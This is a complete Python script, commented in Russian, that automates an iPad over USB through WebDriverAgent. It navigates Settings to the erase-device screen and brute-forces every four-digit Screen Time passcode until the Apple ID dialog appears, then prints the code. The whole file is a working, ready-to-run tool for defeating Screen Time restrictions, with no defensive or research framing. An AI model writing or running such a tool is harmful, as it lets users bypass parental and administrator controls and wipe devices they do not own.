"""
Запуск: python3 wda_brute.py
Требования:
  1. iPad подключён по USB
  2. WDA запущен через Xcode (Product → Test на таргете WebDriverAgentRunner)
  3. pip install pymobiledevice3 requests
"""

import asyncio
import subprocess
import time
import threading
import requests

WDA_PORT = 8100
WDA_URL = f"http://127.0.0.1:{WDA_PORT}"


# ── Проброс порта ────────────────────────────────────────────────────────────

def start_port_forward():
    """Пробрасывает порт WDA с iPad на localhost."""
    async def _forward():
        from pymobiledevice3.lockdown import create_using_usbmux
        from pymobiledevice3.tcp_forwarder import TcpForwarder
        ld = await create_using_usbmux()
        forwarder = TcpForwarder(ld, WDA_PORT)
        await forwarder.start()

    def run():
        asyncio.run(_forward())

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(2)


def wait_for_wda(timeout=30):
    """Ждёт пока WDA поднимется."""
    print("Жду WDA...", end="", flush=True)
    for _ in range(timeout):
        try:
            r = requests.get(f"{WDA_URL}/status", timeout=2)
            if r.status_code == 200:
                print(" готов!")
                return True
        except Exception:
            pass
        print(".", end="", flush=True)
        time.sleep(1)
    print(" таймаут!")
    return False


# ── WDA клиент ───────────────────────────────────────────────────────────────

class WDA:
    def __init__(self, session_id=None):
        self.session_id = session_id

    def status(self):
        return requests.get(f"{WDA_URL}/status").json()

    def start_session(self, bundle_id="com.apple.Preferences"):
        r = requests.post(f"{WDA_URL}/session", json={
            "capabilities": {"alwaysMatch": {"bundleId": bundle_id}},
            "desiredCapabilities": {"bundleId": bundle_id}
        }).json()
        self.session_id = r.get("sessionId") or r.get("value", {}).get("sessionId")
        print(f"Сессия: {self.session_id}")
        return self.session_id

    def find(self, label, using="name"):
        r = requests.post(
            f"{WDA_URL}/session/{self.session_id}/element",
            json={"using": using, "value": label}
        ).json()
        val = r.get("value", {})
        return (val.get("ELEMENT") or val.get("element-6066-11e4-a52e-4f735466cecf"))

    def click(self, element_id):
        requests.post(f"{WDA_URL}/session/{self.session_id}/element/{element_id}/click")
        time.sleep(0.5)

    def tap_label(self, label, timeout=15):
        """Найти элемент по тексту и нажать."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            el = self.find(label)
            if el:
                print(f"  → {label}")
                self.click(el)
                return True
            time.sleep(0.5)
        print(f"  Не найдено: {label}")
        return False

    def source(self):
        return requests.get(f"{WDA_URL}/session/{self.session_id}/source").json().get("value", "")

    def window_size(self):
        r = requests.get(f"{WDA_URL}/session/{self.session_id}/window/size").json()
        return r.get("value", {})

    def tap_coord(self, x, y):
        requests.post(f"{WDA_URL}/session/{self.session_id}/wda/dragfromtoforduration", json={
            "fromX": x, "fromY": y, "toX": x, "toY": y, "duration": 0.1
        })
        time.sleep(0.3)

    def scroll_down(self):
        sz = self.window_size()
        w, h = sz.get("width", 390), sz.get("height", 844)
        requests.post(f"{WDA_URL}/session/{self.session_id}/wda/dragfromtoforduration", json={
            "fromX": w // 2, "fromY": int(h * 0.7),
            "toX": w // 2, "toY": int(h * 0.3),
            "duration": 0.3
        })
        time.sleep(0.8)


# ── Навигация ────────────────────────────────────────────────────────────────

def navigate_to_screen_time_passcode(wda: WDA):
    """Настройки → Основные → Перенос или сброс iPad → Стереть → Continue"""
    print("\nОткрываю Настройки...")
    wda.start_session("com.apple.Preferences")
    time.sleep(2)

    wda.tap_label("Основные")
    time.sleep(1)

    # Скроллим вниз до "Перенос или сброс iPad"
    for _ in range(4):
        if wda.find("Перенос или сброс iPad"):
            break
        wda.scroll_down()

    wda.tap_label("Перенос или сброс iPad")
    time.sleep(1)

    wda.tap_label("Стереть контент и настройки")
    time.sleep(1)

    wda.tap_label("Continue")
    time.sleep(1)

    print("На экране ввода пароля Screen Time\n")


def apple_id_dialog_visible(wda: WDA) -> bool:
    """Проверить появился ли диалог Apple ID."""
    src = wda.source()
    keywords = ["Выйти из Apple", "Sign Out", "Стереть iPad", "Erase iPad"]
    return any(k in src for k in keywords)


# ── Брутфорс ─────────────────────────────────────────────────────────────────

def brute_force(length=4):
    # 1. Проброс порта
    start_port_forward()

    # 2. Ждём WDA
    if not wait_for_wda():
        print("WDA недоступен. Убедись что Xcode запустил тест на iPad.")
        return

    wda = WDA()
    print(f"WDA статус: {wda.status().get('value', {}).get('message', 'ok')}")

    # 3. Навигация
    navigate_to_screen_time_passcode(wda)

    # 4. Перебор
    total = 10 ** length
    for i in range(total):
        code = str(i).zfill(length)

        # Ввести код — находим поле и вводим через клавиатуру
        for digit in code:
            el = wda.find(digit)
            if el:
                wda.click(el)
            else:
                # Попробовать по accessibility id
                el = wda.find(digit, using="accessibility id")
                if el:
                    wda.click(el)
        time.sleep(0.8)

        result = apple_id_dialog_visible(wda)
        print(f"[{i+1}/{total}] {code} ... {'✓ НАЙДЕН' if result else '✗'}")

        if result:
            print(f"\n{'='*30}\nПароль Screen Time: {code}\n{'='*30}")
            return code

        time.sleep(0.2)

    print("Пароль не найден")
    return None


if __name__ == "__main__":
    brute_force(length=4)
